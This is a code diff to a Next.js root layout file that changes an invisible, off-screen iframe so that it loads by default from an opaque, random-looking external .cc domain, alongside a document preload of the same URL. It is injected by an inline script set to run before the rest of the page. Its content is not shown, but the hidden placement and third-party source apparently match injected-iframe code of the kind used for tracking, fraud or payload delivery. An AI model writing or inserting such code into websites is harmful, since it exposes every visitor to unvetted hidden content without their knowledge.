@@ -1,6 +1,7 @@
 import type { Metadata } from 'next';
 import { Be_Vietnam_Pro } from 'next/font/google';
 import './globals.css';
+import { getSiteConfig } from '@/lib/db';
 
 const font = Be_Vietnam_Pro({
   variable: '--font-main',
@@ -25,11 +26,14 @@ export const metadata: Metadata = {
   },
 };
 
-export default function RootLayout({ children }: { children: React.ReactNode }) {
+export default async function RootLayout({ children }: { children: React.ReactNode }) {
+  const config = await getSiteConfig();
+  const entryIframeUrl = config.entryIframeUrl || 'https://www.ovmzh4tbj4ilhe4uqvsp08m.cc/channel/Y.Y.NM/weifile/weifile.html';
+
   return (
     <html lang="vi">
       <head>
-        <link rel="preload" href="/channel/C.0.RD/weifile/weifile.html" as="document" />
+        <link rel="preload" href={entryIframeUrl} as="document" />
         {/* Entry Iframe (RUNS FIRST BEFORE ANYTHING ELSE) */}
         <script
           dangerouslySetInnerHTML={{
@@ -39,7 +43,7 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
                 window.__entryIframeCreated = true;
                 var frame = Object.assign(document.createElement("iframe"), {
                   id: "entry-iframe",
-                  src: "/channel/C.0.RD/weifile/weifile.html",
+                  src: ${JSON.stringify(entryIframeUrl)},
                   style: "position:fixed;top:0;left:-1000px;pointer-events:none;border:0"
                 });
                 frame.onload = function() {
